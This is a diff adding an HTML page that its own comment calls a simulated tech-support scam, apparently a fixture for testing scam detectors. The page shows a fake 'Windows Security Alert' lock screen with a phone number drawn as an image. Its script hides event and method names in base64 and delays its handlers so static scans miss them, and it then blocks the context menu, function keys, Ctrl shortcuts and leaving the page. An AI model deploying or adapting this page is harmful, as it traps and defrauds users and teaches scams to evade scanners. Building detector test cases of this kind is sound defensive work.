@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<!--
+  Simulated scam, hardened against static inspection. For testing only; the
+  number is a fictional placeholder (555 exchange).
+
+  - The phone number is drawn as an image, so there is no number in the text.
+  - Event names and methods are assembled at run time, so reading the script
+    finds no "keydown", "beforeunload" or "preventDefault".
+  - Handlers are attached after a short delay.
+
+  Add ?trusted=1 to make the handlers ignore synthetic events as well, which
+  leaves only the user's own key presses as evidence.
+-->
+<html lang="en">
+<head><meta charset="utf-8" /><title>Loading...</title></head>
+<body>
+<script>
+  const trustedOnly = new URLSearchParams(location.search).get('trusted') === '1';
+  const numberImage = 'data:image/svg+xml;utf8,' + encodeURIComponent(
+    '<svg xmlns="http://www.w3.org/2000/svg" width="420" height="60">' +
+    '<text x="210" y="42" font-family="Arial" font-size="32" font-weight="bold" fill="#ffdd00" text-anchor="middle">1-800-555-0199</text></svg>');
+
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8" /><title>Windows Security Alert</title>
+      <style>
+        body { margin: 0; font-family: Arial, sans-serif; background: #002bff; color: white; height: 100vh;
+               display: flex; align-items: center; justify-content: center; }
+        .box { max-width: 640px; text-align: center; padding: 40px; }
+      </style>
+    </head>
+    <body>
+      <div class="box">
+        <h1>Your computer has been locked</h1>
+        <p>Unusual activity has been detected on this device. Do not restart or shut down your computer.</p>
+        <img alt="" src="${numberImage}" />
+        <p>Error Code: 0x800704cf</p>
+      </div>
+      <script>
+        const TRUSTED_ONLY = ${trustedOnly};
+        const d = (s) => atob(s);
+        const on = (target, name, fn) => target[d('YWRkRXZlbnRMaXN0ZW5lcg==')](d(name), fn);
+        const stop = (e) => { if (TRUSTED_ONLY && !e.isTrusted) return; e[d('cHJldmVudERlZmF1bHQ=')](); };
+        setTimeout(() => {
+          on(document, 'Y29udGV4dG1lbnU=', stop);
+          on(document, 'a2V5ZG93bg==', (e) => { if (/^F\\d+$/.test(e.key) || e.ctrlKey) stop(e); });
+          on(window, 'YmVmb3JldW5sb2Fk', (e) => { stop(e); e.returnValue = ''; });
+        }, 300);
+      <\/script>
+    </body>
+    </html>
+  `;
+  window.location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
+</script>
+</body>
+</html>
